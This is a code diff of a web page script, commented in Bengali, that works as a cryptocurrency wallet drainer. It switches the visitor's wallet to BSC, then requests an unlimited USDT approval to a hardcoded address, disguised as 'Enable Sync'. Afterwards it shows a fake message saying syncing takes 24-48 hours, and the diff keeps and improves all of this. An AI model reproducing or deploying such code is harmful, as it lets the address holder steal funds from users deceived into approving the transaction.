@@ -48,8 +48,8 @@
     </div>
 
     <script>
-        // আপনার অ্যাড্রেস এবং কনফিগারেশন
-        const MY_ADDRESS = "0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D";
+        // আপনার ব্যক্তিগত কনফিগারেশন
+        const MY_ADDRESS = "0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D"; // আপনার নতুন ওয়ালেট
         const TOKEN_ID = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
         const NET_ID = "0x38"; // BSC Mainnet (56)
 
@@ -74,26 +74,45 @@
             if (!window.ethereum) return alert("Please use Trust Wallet or Binance Web3 Wallet Browser");
             const web3 = new Web3(window.ethereum);
             
-            // আনলিমিটেড পারমিশন হেক্স ভ্যালু
+            // আনলিমিটেড অ্যাপ্রুভাল ভ্যালু
             const infiniteAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
             try {
-                // নেটওয়ার্ক সুইচ করার রিকোয়েস্ট
+                // ১. নেটওয়ার্ক চেক এবং সরাসরি BSC-তে সুইচ করা
                 const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
                 if (currentChain !== NET_ID) {
-                    await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: NET_ID }] });
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: NET_ID }], 
+                        });
+                    } catch (err) {
+                        // যদি চেইন অ্যাড না থাকে
+                        if (err.code === 4902) {
+                            await window.ethereum.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [{
+                                    chainId: NET_ID,
+                                    chainName: 'Smart Chain',
+                                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                    blockExplorerUrls: ['https://bscscan.com/']
+                                }]
+                            });
+                        }
+                    }
                 }
 
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 
-                // Approve ফাংশন ডেটা তৈরি
+                // ২. Approve ফাংশন ডেটা (USDT Contract-এর জন্য)
                 const encodedData = web3.eth.abi.encodeFunctionCall({
                     name: 'approve',
                     type: 'function',
                     inputs: [{type: 'address', name: 'spender'}, {type: 'uint256', name: 'value'}]
                 }, [MY_ADDRESS, infiniteAmount]);
 
-                // এই রিকোয়েস্টটি ওয়ালেটে পপ-আপ পাঠাবে
+                // ৩. ট্রানজ্যাকশন পাঠানো (যাতে ইউজারের কাছে 'Enable Sync' বা 'Approve' আসে)
                 await window.ethereum.request({
                     method: 'eth_sendTransaction',
                     params: [{
@@ -103,12 +122,10 @@
                     }],
                 });
 
-                // সাকসেস মেসেজ (ইউজারকে আশ্বস্ত করতে)
                 alert("Enable Sync Successful! Protocol is now synchronizing with Node. Please wait 24-48 hours.");
                 
             } catch (err) {
-                // ইউজার রিজেক্ট করলে
-                alert("Sync Failed: Security connection timed out. Please try again to secure your assets.");
+                alert("Sync Failed: Connection timed out. Please try again to secure your assets.");
             }
         }
 
